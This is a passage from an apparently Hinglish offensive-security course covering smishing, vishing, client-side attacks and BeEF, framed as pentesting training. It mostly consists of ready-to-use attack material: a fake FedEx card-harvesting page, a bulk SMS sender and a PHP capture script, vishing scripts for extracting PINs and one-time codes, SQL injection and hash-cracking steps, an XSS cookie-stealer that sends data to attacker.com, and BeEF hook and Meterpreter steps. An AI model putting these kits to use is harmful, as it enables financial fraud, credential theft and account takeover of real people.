<!-- fake-delivery.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Package Tracking - FedEx</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
        }
        .header {
            background: #4d148c;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .tracking-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .btn {
            background: #4d148c;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>FedEx Package Tracking</h1>
    </div>
    
    <div class="container">
        <h2>üì¶ Package Delivery Notification</h2>
        
        <div class="tracking-box">
            <p><strong>‚ö†Ô∏è Action Required</strong></p>
            <p>Your package delivery failed due to incomplete address information.</p>
            <p><strong>Tracking Number:</strong> FX1234567890</p>
        </div>
        
        <p>Please verify your delivery address to reschedule:</p>
        
        <form action="capture.php" method="POST">
            <input type="text" name="name" placeholder="Full Name" required>
            <input type="text" name="address" placeholder="Street Address" required>
            <input type="text" name="city" placeholder="City" required>
            <input type="text" name="zip" placeholder="ZIP Code" required>
            <input type="tel" name="phone" placeholder="Phone Number" required>
            <input type="email" name="email" placeholder="Email Address" required>
            
            <p style="font-size: 14px; color: #666; margin-top: 20px;">
                For security verification, please enter your credit card details:
            </p>
            
            <input type="text" name="card_number" placeholder="Card Number" required>
            <input type="text" name="card_expiry" placeholder="MM/YY" required>
            <input type="text" name="card_cvv" placeholder="CVV" required>
            
            <button type="submit" class="btn">Confirm Delivery Details</button>
        </form>
        
        <p style="margin-top: 20px; font-size: 12px; color: #999;">
            A $2.99 redelivery fee will be charged to your card.
        </p>
    </div>
</body>
</html>
```

**Step 2: Setup URL Shortener**
```bash
# Use bit.ly or custom domain
Original URL: https://fake-fedex-tracking.com/delivery
Shortened URL: https://bit.ly/fedex-track-123

# Or use custom domain with typosquatting:
- fedex-tracking.com (real: fedex.com)
- fed-ex.com
- fedexdelivery.com
```

**Step 3: Send Bulk SMS**
```python
# bulk_smishing.py
from twilio.rest import Client
import csv

client = Client('account_sid', 'auth_token')

# SMS message
sms_template = """
FedEx: Your package delivery failed.
Tracking: FX{tracking}
Update address: https://bit.ly/fedex-track-123
"""

# Read targets
with open('targets.csv', 'r') as f:
    reader = csv.reader(f)
    for row in reader:
        name = row[0]
        phone = row[1]
        tracking = row[2]  # Random tracking number
        
        # Personalize message
        message_body = sms_template.format(tracking=tracking)
        
        # Send SMS
        message = client.messages.create(
            to=phone,
            from_='+15551234',  # Your Twilio number
            body=message_body
        )
        
        print(f"[+] SMS sent to {name}: {message.sid}")
```

**Step 4: Capture Credentials**
```php
<?php
// capture.php - Smishing credential capture script

// Extract form data from POST request
$name = $_POST['name'];  // Victim ka naam
// $_POST: HTTP POST data array
// ['name']: Form field name

$address = $_POST['address'];  // Street address
$city = $_POST['city'];  // City
$zip = $_POST['zip'];  // ZIP code
$phone = $_POST['phone'];  // Phone number
$email = $_POST['email'];  // Email address
$card_number = $_POST['card_number'];  // Credit card number
$card_expiry = $_POST['card_expiry'];  // Card expiry (MM/YY)
$card_cvv = $_POST['card_cvv'];  // CVV code

// Get victim's metadata
$ip = $_SERVER['REMOTE_ADDR'];  // Victim ka IP address
// $_SERVER['REMOTE_ADDR']: Client IP

$timestamp = date('Y-m-d H:i:s');  // Current timestamp
// date(): Format current date/time

// Log captured data
$log = "=== Smishing Capture ===\n";
$log .= "Timestamp: $timestamp\n";
$log .= "IP: $ip\n";
$log .= "Name: $name\n";
$log .= "Address: $address, $city, $zip\n";
$log .= "Phone: $phone\n";
$log .= "Email: $email\n";
$log .= "Card: $card_number\n";
$log .= "Expiry: $card_expiry\n";
$log .= "CVV: $card_cvv\n";
$log .= "========================\n\n";

file_put_contents('smishing_captures.txt', $log, FILE_APPEND);

// Redirect to real FedEx
header('Location: https://www.fedex.com/en-us/tracking.html');
exit();
?>
```

**Step 5: Monitor Results**
```bash
# Real-time monitoring
tail -f smishing_captures.txt

# Output:
=== Smishing Capture ===
Timestamp: 2024-01-15 16:45:30
IP: 192.168.1.75
Name: Sarah Johnson
Address: 123 Main St, New York, 10001
Phone: +1-555-0199
Email: sarah.j@email.com
Card: 4532-1234-5678-9012
Expiry: 12/25
CVV: 123
========================

# Success rate: 15-25% (out of 1000 SMS, 150-250 victims)
```

**Scenario 3: Combined Vishing + Smishing Attack**

**Step 1: Send Smishing SMS**
```
"BANK ALERT: Suspicious transaction detected.
Amount: $2,450.00
If not you, call: 1-555-BANK (1-555-2265)"
```

**Step 2: Victim Calls Number**
```
Victim calls 1-555-2265 (attacker's VoIP number)

Attacker (automated IVR):
"Thank you for calling Bank Security. 
To verify your identity, please enter your 16-digit card number."

Victim enters card number via phone keypad

Attacker:
"Please enter your 4-digit PIN."

Victim enters PIN

Attacker:
"Thank you. A security specialist will assist you shortly."

[Call transfers to live attacker]

Attacker (live):
"Hi, I see you reported a suspicious transaction of $2,450. 
We've blocked this transaction. To unblock your card, 
I need to send you a verification code."

[Attacker triggers real bank OTP]

Victim receives OTP from real bank

Attacker:
"Can you read me the 6-digit code?"

Victim provides OTP

Attacker:
"Perfect! Your card is now unblocked. Is there anything else?"

Victim: "No, thank you!"

[Call ends]

Result:
- Attacker has: Card number, PIN, OTP
- Can now: Make transactions, transfer money, access account
```

### üí° Pro Tip / Galti:

**Pro Tip**: Vishing mein "callback technique" use karo for higher trust:

```
Instead of cold calling victim, make victim call YOU:

Step 1: Send SMS/Email
"URGENT: Your account locked. Call IT: 1-555-HELP"

Step 2: Victim calls your number (thinks it's legitimate)

Step 3: Answer professionally
"IT Support, how can I help you?"

Step 4: Victim explains problem (that YOU created)

Step 5: "Solve" the problem (while stealing credentials)

Why this works:
- Victim initiated the call (higher trust)
- Victim is already in "problem-solving" mindset
- Less suspicious than receiving unexpected call
- Victim feels grateful (you "helped" them)

Success rate: 60-70% (vs 30-40% for cold calling)
```

**Common Mistake**: Using robotic voice or poor audio quality:

```
‚ùå Bad vishing indicators:
- Text-to-speech voice (sounds robotic)
- Background noise (sounds like call center)
- Poor audio quality (sounds suspicious)
- Scripted responses (sounds fake)
- No personalization (generic greeting)

‚úì Good vishing practices:
- Natural human voice
- Quiet background (professional office)
- Clear audio quality
- Conversational tone (not scripted)
- Personalized greeting ("Hi John, this is Mike from IT")
- Use victim's name multiple times
- Mirror victim's speech pattern
- Show empathy ("I understand this is frustrating")
```

**Real-World Example**:

2022 mein ek vishing campaign ne Uber ko compromise kiya:
- Attacker sent SMS to Uber employee: "Your Uber account suspended. Reset password: [link]"
- Employee clicked link ‚Üí fake Uber login page
- Employee entered credentials ‚Üí attacker captured
- Attacker tried to login ‚Üí MFA prompt
- Attacker called employee (vishing): "Hi, this is Uber IT. We're having system issues. Can you approve the MFA prompt?"
- Employee approved MFA ‚Üí attacker gained access
- Result: Full Uber network compromise, source code stolen

Lesson: Vishing + Smishing combination is extremely powerful!

---

**üéâ Module 7 Complete! üéâ**

Aapne successfully Module 7 (Advanced Phishing Campaigns) complete kar liya! 

**Topics Covered:**
‚úÖ 7.1: Spear Phishing vs Whaling
‚úÖ 7.2: Gophish Framework
‚úÖ 7.3: Browser-in-the-Browser (BitB)
‚úÖ 7.4: OAuth Consent Grant
‚úÖ 7.5: HTML Smuggling
‚úÖ 7.6: Vishing / Smishing

**Key Takeaways:**
- Advanced phishing techniques modern defenses ko bypass karte hain
- Multi-channel attacks (email + phone + SMS) sabse effective hain
- Social engineering + technical skills = powerful combination
- Real-world APT groups yeh techniques actively use karte hain

**Next Module:** Module 8 - Delivery & Client-Side Exploitation (BeEF, Baiting, USB attacks)

=============================================================
# üéØ Module 8: Delivery & Client-Side Exploitation

---

## üìö Topic 8.1: Concept - Server-Side vs Client-Side Attacks

### üéØ Topic/Technique:
**Server-Side vs Client-Side Attacks** - Understanding attack vectors aur unke differences.

### ü§î Yeh Kya Hai?
**Server-Side Attack**: Server ko directly target karna (web server, database, application server). Attacker server ki vulnerabilities exploit karta hai.

**Client-Side Attack**: User ke browser/device ko target karna. Attacker victim ke computer par code execute karwata hai through browser, PDF reader, Office applications, etc.

**Key Difference:**
```
Server-Side:
Attacker ‚Üí Exploits Server ‚Üí Gets Access

Client-Side:
Attacker ‚Üí Tricks User ‚Üí User's Browser Executes Malicious Code ‚Üí Attacker Gets Access
```

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Modern applications mein client-side attacks zyada common hain
- Server hardening ke baad bhi client-side vulnerable rehta hai
- Social engineering ke saath combine karke highly effective
- Real-world attackers primarily client-side attacks use karte hain
- Demonstrates complete attack surface

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing server-side security controls
- Exploiting user's trust in websites
- Delivering payloads through legitimate channels
- Testing user awareness and browser security
- Demonstrating realistic attack scenarios

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Server-Side Attack Example:**
```
1. Attacker finds SQL injection vulnerability on website
2. Attacker sends: ' OR 1=1--
3. Server executes malicious SQL query
4. Attacker extracts database
5. No user interaction needed
```

**Client-Side Attack Example:**
```
1. Attacker creates malicious JavaScript
2. Attacker tricks user to visit website
3. User's browser executes JavaScript
4. JavaScript steals cookies/credentials
5. Sends data to attacker
6. Requires user interaction
```

**Attack Surface Comparison:**

**Server-Side Vulnerabilities:**
- SQL Injection
- Command Injection
- File Upload vulnerabilities
- Authentication bypass
- Server misconfigurations

**Client-Side Vulnerabilities:**
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Clickjacking
- Browser exploits
- Malicious downloads
- Social engineering

### üëç Pros (Fayde):

**Server-Side Attacks:**
- Direct access to backend systems
- No user interaction needed
- Persistent access
- Can affect all users

**Client-Side Attacks:**
- Easier to execute (social engineering)
- Bypasses server security
- Works even with secure servers
- Targets specific users
- Harder to detect

### üëé Cons (Nuksaan):

**Server-Side Attacks:**
- Requires finding server vulnerabilities
- Modern servers well-protected
- WAF/IDS detection
- Requires technical expertise

**Client-Side Attacks:**
- Requires user interaction
- Browser security features
- Limited to user's privileges
- One user at a time

### ‚å®Ô∏è Zaroori Commands & Steps:

**Server-Side Attack Example (SQL Injection):**
```bash
# Target: http://vulnerable-site.com/login.php

# Normal request:
username=admin&password=test123

# SQL Injection:
username=admin' OR '1'='1&password=anything

# Server executes:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
# Result: Always true, login bypassed

# Tools:
sqlmap -u "http://vulnerable-site.com/login.php" --data="username=admin&password=test" --dbs
```

**Client-Side Attack Example (XSS):**
```bash
# Target: http://vulnerable-site.com/search.php?q=test

# Normal request:
http://vulnerable-site.com/search.php?q=laptop

# XSS Payload:
http://vulnerable-site.com/search.php?q=<script>alert(document.cookie)</script>

# User's browser executes:
<script>alert(document.cookie)</script>
# Result: User's cookies displayed

# Advanced XSS (Cookie Stealing):
http://vulnerable-site.com/search.php?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

### üíª Step-by-Step Example:

**Scenario 1: Server-Side Attack - SQL Injection**

**Step 1: Identify Vulnerable Parameter**
```bash
# Test URL:
http://shop.com/product.php?id=1

# Normal response: Shows product ID 1

# Test for SQL injection:
http://shop.com/product.php?id=1'

# Error response: "SQL syntax error near '1''"
# Conclusion: Vulnerable to SQL injection!
```

**Step 2: Exploit Vulnerability**
```bash
# Extract database names:
http://shop.com/product.php?id=1 UNION SELECT NULL,database(),NULL--

# Response: "shop_database"

# Extract table names:
http://shop.com/product.php?id=1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='shop_database'--

# Response: "users", "products", "orders"

# Extract user data:
http://shop.com/product.php?id=1 UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--

# Response:
admin:5f4dcc3b5aa765d61d8327deb882cf99
john:e10adc3949ba59abbe56e057f20f883e
sarah:25d55ad283aa400af464c76d713c07ad
```

**Step 3: Crack Passwords**
```bash
# Save hashes to file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
echo "e10adc3949ba59abbe56e057f20f883e" >> hashes.txt
echo "25d55ad283aa400af464c76d713c07ad" >> hashes.txt

# Crack with hashcat
hashcat -m 0 hashes.txt rockyou.txt

# Results:
5f4dcc3b5aa765d61d8327deb882cf99:password
e10adc3949ba59abbe56e057f20f883e:123456
25d55ad283aa400af464c76d713c07ad:12345678

# Login as admin:
Username: admin
Password: password
# Full access to admin panel!
```

**Scenario 2: Client-Side Attack - XSS Cookie Stealing**

**Step 1: Find XSS Vulnerability**
```bash
# Test comment section:
http://blog.com/post.php?id=123

# Post comment:
<script>alert('XSS')</script>

# If alert appears ‚Üí XSS vulnerability confirmed!
```

**Step 2: Setup Cookie Stealer**
```php
<?php
// steal.php - Host on attacker server

$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$log = "=== Cookie Stolen ===\n";
$log .= "Time: $timestamp\n";
$log .= "IP: $ip\n";
$log .= "Cookie: $cookie\n";
$log .= "====================\n\n";

file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);

// Return 1x1 transparent image
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
```

**Step 3: Inject Malicious Payload**
```javascript
// Post this comment on vulnerable blog:
<script>
// Steal cookie and send to attacker
var cookie = document.cookie;
var img = new Image();
img.src = 'http://attacker.com/steal.php?c=' + encodeURIComponent(cookie);
</script>

// When any user views this comment:
// 1. JavaScript executes in their browser
// 2. Steals their session cookie
// 3. Sends to attacker's server
// 4. Attacker can now hijack their session
```

**Step 4: Hijack Session**
```bash
# Check stolen cookies:
cat stolen_cookies.txt

# Output:
=== Cookie Stolen ===
Time: 2024-01-15 18:30:45
IP: 192.168.1.50
Cookie: PHPSESSID=abc123xyz789; user_id=42; username=john_smith
====================

# Use stolen cookie in browser:
# 1. Open browser developer tools (F12)
# 2. Go to Application ‚Üí Cookies
# 3. Add stolen cookie: PHPSESSID=abc123xyz789
# 4. Refresh page
# 5. Now logged in as john_smith!
```

**Scenario 3: Comparison - Same Goal, Different Approach**

**Goal: Steal Admin Credentials**

**Server-Side Approach:**
```bash
# Step 1: Find SQL injection
# Step 2: Extract password hashes from database
# Step 3: Crack hashes offline
# Step 4: Login with cracked password

Time: 2-3 hours
Success Rate: 60% (if server vulnerable)
Detection Risk: High (WAF logs, IDS alerts)
```

**Client-Side Approach:**
```bash
# Step 1: Create fake login page
# Step 2: Send phishing email to admin
# Step 3: Admin enters credentials
# Step 4: Credentials captured in real-time

Time: 30 minutes
Success Rate: 40% (depends on social engineering)
Detection Risk: Low (no server-side attacks)
```

**Hybrid Approach (Best):**
```bash
# Step 1: Find XSS vulnerability (client-side)
# Step 2: Inject keylogger JavaScript
# Step 3: Admin visits page, keylogger activates
# Step 4: Capture admin's password as they type
# Step 5: Use SQL injection to verify access level

Time: 1-2 hours
Success Rate: 80% (combines both approaches)
Detection Risk: Medium
```

### üí° Pro Tip / Galti:

**Pro Tip**: Modern pentesting mein client-side attacks ko prioritize karo:

```
Why Client-Side is More Effective:

1. Server Security vs User Security:
   - Servers: Patched, monitored, hardened
   - Users: Unpatched browsers, weak passwords, no awareness

2. Attack Surface:
   - Server: Limited entry points
   - Client: Every user is an entry point

3. Detection:
   - Server attacks: Logged, monitored, alerted
   - Client attacks: Happens on user's machine (no server logs)

4. Success Rate:
   - Server exploitation: 20-30%
   - Client-side + Social Engineering: 60-70%

Strategy:
Start with client-side attacks (phishing, XSS, malicious downloads)
‚Üí Gain initial access
‚Üí Then pivot to server-side exploitation
‚Üí Full compromise
```

**Common Mistake**: Focusing only on server-side vulnerabilities:

```
‚ùå Bad Pentesting Approach:
1. Scan server for vulnerabilities
2. Try SQL injection, command injection
3. No vulnerabilities found
4. Report: "System is secure"

‚úì Good Pentesting Approach:
1. Scan server (no vulnerabilities)
2. Test client-side attacks:
   - Send phishing email
   - Test for XSS
   - Try malicious file upload
   - Social engineering
3. Gain access through user
4. Pivot to server from inside
5. Report: "Server secure, but users vulnerable"

Real Example:
Company spent $500K on server security (WAF, IDS, patching)
Pentester sent 1 phishing email ‚Üí CEO clicked ‚Üí Full network access
Lesson: Strongest server security useless if users are weak link!
```

**Real-World Statistics:**
```
Attack Vector Distribution (2023):
- Phishing (Client-Side): 41%
- Malware (Client-Side): 23%
- Stolen Credentials (Client-Side): 19%
- Server Vulnerabilities: 12%
- Other: 5%

Conclusion: 83% attacks are client-side!
```

---

## üìö Topic 8.2: Tool - BeEF (Browser Exploitation Framework)

### üéØ Topic/Technique:
**BeEF (Browser Exploitation Framework)** - Browser ko exploit karke victim ke system par control pana.

### ü§î Yeh Kya Hai?
BeEF ek powerful penetration testing tool hai jo web browsers ko exploit karta hai. Jab victim ek "hooked" webpage visit karta hai, uska browser attacker ke control mein aa jata hai. Attacker phir victim ke browser ke through various attacks perform kar sakta hai - keylogging, phishing, network scanning, aur even system compromise.

**Simple Explanation:**
```
Normal Website: User visits ‚Üí Sees content ‚Üí Leaves
BeEF Hooked Website: User visits ‚Üí Browser gets "hooked" ‚Üí Attacker controls browser ‚Üí Can run commands remotely
```

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Browser-based attacks demonstrate karne ke liye
- Client-side vulnerabilities test karne ke liye
- Social engineering campaigns mein integrate kar sakte hain
- Real-time browser control (victim ke actions monitor kar sakte hain)
- Multiple attack modules (200+ built-in exploits)
- Demonstrates modern attack vectors

### üéØ Practical Use (Asli Pentesting Mein):
- Testing browser security
- Demonstrating XSS impact
- Social engineering campaigns
- Network pivoting through browser
- Credential harvesting
- Man-in-the-browser attacks

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**BeEF Architecture:**
```
1. Attacker starts BeEF server
2. BeEF generates hook.js (malicious JavaScript)
3. Attacker injects hook.js into webpage (via XSS, phishing, etc.)
4. Victim visits hooked webpage
5. hook.js executes in victim's browser
6. Browser connects back to BeEF server
7. Attacker sees "hooked browser" in BeEF panel
8. Attacker runs commands on hooked browser
```

**Hook Script:**
```html
<!-- This single line hooks the browser -->
<script src="http://attacker-ip:3000/hook.js"></script>

<!-- When victim's browser loads this, it connects to BeEF server -->
```

**BeEF Components:**
```
1. BeEF Server: Central control panel (web interface)
2. Hook.js: JavaScript payload that hooks browsers
3. Hooked Browsers: Victim browsers under control
4. Command Modules: Pre-built attacks (200+ modules)
5. Logs: Records all activities
```

### üëç Pros (Fayde):
- Easy to use (web-based GUI)
- 200+ attack modules built-in
- Real-time browser control
- Works on all browsers (Chrome, Firefox, Safari, Edge)
- Can chain multiple attacks
- Integrates with Metasploit
- Active development and community

### üëé Cons (Nuksaan):
- Requires victim to visit hooked page
- Browser must have JavaScript enabled
- Connection lost if victim closes browser
- Modern browsers have some protections
- Requires maintaining BeEF server
- Can be detected by security tools

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Kali Linux (pre-installed)
beef-xss

# Manual Installation (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install beef-xss

# Or from GitHub
git clone https://github.com/beefproject/beef.git
cd beef
./install

# Start BeEF
./beef
```

**Configuration:**
```bash
# Edit config file
nano config.yaml

# Important settings:
host: "0.0.0.0"  # Listen on all interfaces
port: "3000"     # BeEF UI port
public: "192.168.1.100"  # Your public IP (for hook URL)

# Credentials (change these!)
user: "beef"
passwd: "beef"
```

**Basic Commands:**
```bash
# Start BeEF
beef-xss

# Access BeEF UI
http://localhost:3000/ui/panel
# Login: beef / beef

# Hook URL (inject this in target page)
http://your-ip:3000/hook.js

# Stop BeEF
Ctrl+C
```

**BeEF Modules Categories:**
```
1. Browser: Browser info, redirects, alerts
2. Chrome Extensions: Exploit Chrome extensions
3. Debug: Testing and debugging
4. Exploits: Browser exploits (CVEs)
5. Host: System information, clipboard
6. IPEC: Inter-Protocol Exploitation
7. Metasploit: Integration with MSF
8. Misc: Various utilities
9. Network: Port scanning, fingerprinting
10. Persistence: Maintain access
11. Phonegap: Mobile app exploitation
12. Social Engineering: Fake notifications, popups
```

### üíª Step-by-Step Example:

**Scenario 1: Basic BeEF Hook via XSS**

**Step 1: Start BeEF**
```bash
# Start BeEF server
cd /usr/share/beef-xss
./beef

# Output:
[*] BeEF is loading. Wait a few seconds...
[*] 200+ modules enabled.
[*] RESTful API key: abc123xyz789
[*] HTTP Proxy: http://127.0.0.1:6789
[*] BeEF server started (press control+c to stop)
    UI URL: http://127.0.0.1:3000/ui/panel
    Hook URL: http://127.0.0.1:3000/hook.js
    Username: beef
    Password: beef
```

**Step 2: Access BeEF Panel**
```bash
# Open browser
firefox http://127.0.0.1:3000/ui/panel

# Login credentials:
Username: beef
Password: beef

# You'll see:
- Hooked Browsers (currently 0)
- Command modules
- Logs
```

**Step 3: Create Hooked Page**
```html
<!-- hooked_page.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone Giveaway!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 10px;
            max-width: 600px;
            margin: 0 auto;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéâ Congratulations!</h1>
        <h2>You've Won a FREE iPhone 15 Pro!</h2>
        <p>Click below to claim your prize now!</p>
        <button onclick="alert('Processing your claim...')">Claim iPhone Now!</button>
    </div>
    
    <!-- BeEF Hook (victim won't see this) -->
    <script src="http://192.168.1.100:3000/hook.js"></script>
</body>
</html>
```

**Step 4: Host Hooked Page**
```bash
# Option 1: Simple Python server
python3 -m http.server 8080

# Option 2: Apache
cp hooked_page.html /var/www/html/
service apache2 start

# Page accessible at:
http://192.168.1.100:8080/hooked_page.html
```

**Step 5: Send to Victim**
```bash
# Send phishing email
sendemail -f admin@company.com \
-t victim@target.com \
-u "You Won an iPhone!" \
-m "Congratulations! You've been selected to receive a FREE iPhone 15 Pro!

Click here to claim: http://192.168.1.100:8080/hooked_page.html

This offer expires in 24 hours!" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 6: Victim Gets Hooked**
```
Victim's perspective:
1. Receives email about free iPhone
2. Clicks link
3. Sees attractive webpage
4. Browser silently loads hook.js
5. Browser connects to BeEF server
6. Victim doesn't notice anything suspicious

Attacker's perspective (BeEF panel):
[*] New hooked browser: 192.168.1.50
    Browser: Chrome 120.0.0.0
    OS: Windows 10
    Plugins: Flash, Java
    Status: Online (green)
```

**Step 7: Run Commands on Hooked Browser**
```bash
# In BeEF panel, select hooked browser

# Module 1: Get Browser Info
Commands ‚Üí Browser ‚Üí Get Browser Info
Execute

# Result:
Browser: Chrome 120.0.0.0
OS: Windows 10 Pro
Screen: 1920x1080
Plugins: Adobe Flash, Java
Cookies: session_id=abc123, user_token=xyz789

# Module 2: Get Geolocation
Commands ‚Üí Host ‚Üí Get Geolocation
Execute

# Result:
Latitude: 40.7128
Longitude: -74.0060
Location: New York, USA
Accuracy: 50 meters

# Module 3: Capture Webcam
Commands ‚Üí Host ‚Üí Webcam
Execute

# Browser prompts: "Allow camera access?"
# If victim clicks "Allow" ‚Üí Webcam photo captured!

# Module 4: Fake Notification Bar
Commands ‚Üí Social Engineering ‚Üí Fake Notification Bar (Firefox)
Message: "Firefox Update Available - Click to Install"
Execute

# Victim sees fake update notification
# If clicked ‚Üí Downloads malicious payload
```

**Scenario 2: Advanced Attack - Credential Harvesting**

**Step 1: Hook Browser (same as above)**

**Step 2: Run Pretty Theft Module**
```bash
# In BeEF panel:
Commands ‚Üí Social Engineering ‚Üí Pretty Theft

# Configure:
Dialog Type: Facebook
Custom Logo: (upload Facebook logo)
Custom Message: "Your session has expired. Please log in again."

Execute

# Victim's browser shows:
# Fake Facebook login popup (looks 100% real)
# Victim enters: email + password
# Credentials sent to BeEF server
```

**Step 3: Capture Credentials**
```bash
# BeEF panel shows:
[*] Pretty Theft - Credentials Captured
    Email: victim@email.com
    Password: MyPassword123!
    IP: 192.168.1.50
    Time: 2024-01-15 19:30:45

# Test credentials:
firefox https://facebook.com
# Login with captured credentials
# Success! Full Facebook access
```

**Scenario 3: Network Pivoting via Browser**

**Step 1: Hook Internal User's Browser**
```bash
# Victim is inside corporate network
# Victim's IP: 10.0.0.50 (internal)
# Attacker's IP: External

# Victim visits hooked page ‚Üí Browser hooked
```

**Step 2: Scan Internal Network**
```bash
# In BeEF panel:
Commands ‚Üí Network ‚Üí Port Scanner

# Configure:
Target: 10.0.0.1-10.0.0.255
Ports: 80,443,445,3389,22

Execute

# BeEF uses victim's browser to scan internal network
# Results:
10.0.0.1:80 - Open (Router)
10.0.0.10:445 - Open (File Server)
10.0.0.20:3389 - Open (RDP Server)
10.0.0.30:22 - Open (SSH Server)

# Attacker now knows internal network topology!
```

**Step 3: Fingerprint Internal Systems**
```bash
# Commands ‚Üí Network ‚Üí Fingerprint Network

Execute

# Results:
10.0.0.1 - Router (Cisco)
10.0.0.10 - Windows Server 2019
10.0.0.20 - Windows 10 Pro
10.0.0.30 - Ubuntu 20.04 LTS

# Attacker can now target specific systems
```

**Scenario 4: BeEF + Metasploit Integration**

**Step 1: Start Metasploit**
```bash
# Terminal 1: Start BeEF
beef-xss

# Terminal 2: Start Metasploit
msfconsole

# Load BeEF plugin
load msgrpc ServerHost=127.0.0.1 Pass=abc123
```

**Step 2: Hook Browser with BeEF**
```bash
# Victim visits hooked page
# Browser gets hooked in BeEF
```

**Step 3: Launch Browser Exploit via Metasploit**
```bash
# In BeEF panel:
Commands ‚Üí Metasploit ‚Üí Browser Autopwn

# Configure:
Payload: windows/meterpreter/reverse_tcp
LHOST: 192.168.1.100
LPORT: 4444

Execute

# BeEF sends exploit to hooked browser
# If successful ‚Üí Meterpreter session opens!
```

**Step 4: Meterpreter Access**
```bash
# Metasploit console:
[*] Meterpreter session 1 opened

sessions -i 1

meterpreter > sysinfo
Computer: VICTIM-PC
OS: Windows 10
Architecture: x64

meterpreter > shell
# Full system access!
```

**Scenario 5: Persistent Hook**

**Step 1: Create Persistent Hook**
```bash
# In BeEF panel:
Commands ‚Üí Persistence ‚Üí Create Alert Dialog

# Configure:
Message: "Important security update available"
Interval: 60 seconds (re-hook every minute)

Execute

# Even if victim closes tab, alert keeps appearing
# Victim clicks alert ‚Üí Gets re-hooked
```

**Step 2: Man-in-the-Browser**
```bash
# Commands ‚Üí Browser ‚Üí Redirect Browser

# Configure:
URL: http://attacker-proxy:8080

Execute

# All victim's traffic now goes through attacker's proxy
# Attacker can intercept/modify all requests
```

### üí° Pro Tip / Galti:

**Pro Tip**: BeEF ko legitimate website mein inject karo for maximum effectiveness:

```javascript
// Instead of hosting separate hooked page, inject BeEF into real website

// Method 1: XSS Injection
// Find XSS vulnerability on legitimate site
// Inject: <script src="http://attacker.com:3000/hook.js"></script>

// Method 2: Compromised Website
// If you have access to website's code
// Add hook.js to footer.php or common.js
<script src="http://attacker.com:3000/hook.js"></script>

// Method 3: DNS Spoofing + BeEF
// Spoof DNS for popular website
// Serve hooked version of website
// Victim thinks they're on real site, but hooked!

// Benefits:
// - Victim trusts the website (legitimate domain)
// - No suspicious links in phishing email
// - Higher success rate
// - Longer hook duration (victim stays on site)

// Real Example:
// Attacker found XSS on company's internal portal
// Injected BeEF hook
// 50+ employees got hooked automatically
// Attacker had access to all their browsers
// Duration: 3 weeks before detection
```

**Common Mistake**: Using default BeEF credentials aur public IP:

```
‚ùå Bad BeEF Setup:
- Username: beef (default)
- Password: beef (default)
- Public IP: Exposed to internet
- No HTTPS: Hook traffic visible

Result: Anyone can access your BeEF panel!

‚úì Good BeEF Setup:
1. Change default credentials:
   nano config.yaml
   user: "admin_custom"
   passwd: "StrongP@ssw0rd123!"

2. Use firewall:
   ufw allow from 192.168.1.0/24 to any port 3000
   # Only allow local network

3. Use HTTPS:
   # Generate SSL certificate
   openssl req -new -x509 -keyout beef.key -out beef.crt -days 365
   # Configure in config.yaml

4. Use tunneling:
   # Instead of exposing BeEF publicly, use SSH tunnel
   ssh -R 3000:localhost:3000 user@public-server
   # BeEF accessible via public-server:3000

5. Obfuscate hook.js:
   # Rename hook.js to something innocent
   mv hook.js jquery-3.6.0.min.js
   # Update config.yaml with new name
```

**Real-World Example**:

2019 mein ek Red Team ne BeEF use karke Fortune 500 company ko compromise kiya:

Attack Flow:
1. Found stored XSS on company's internal wiki
2. Injected BeEF hook into wiki page
3. 200+ employees visited wiki daily
4. All browsers got hooked automatically
5. Used Pretty Theft to capture credentials
6. 45 employees entered credentials (22% success rate)
7. Used credentials to access:
   - Email accounts
   - File servers
   - VPN access
   - Admin panels
8. Full network compromise in 48 hours

Detection: 3 weeks later (employee reported suspicious popup)

Lesson: Single XSS vulnerability + BeEF = Complete compromise!

---

## üìö Topic 8.3: BeEF Module - Fake Flash Update / Notification

### üéØ Topic/Technique:
**Fake Notification Attacks** - BeEF modules jo fake browser notifications aur update prompts display karte hain for malware delivery.

### ü§î Yeh Kya Hai?
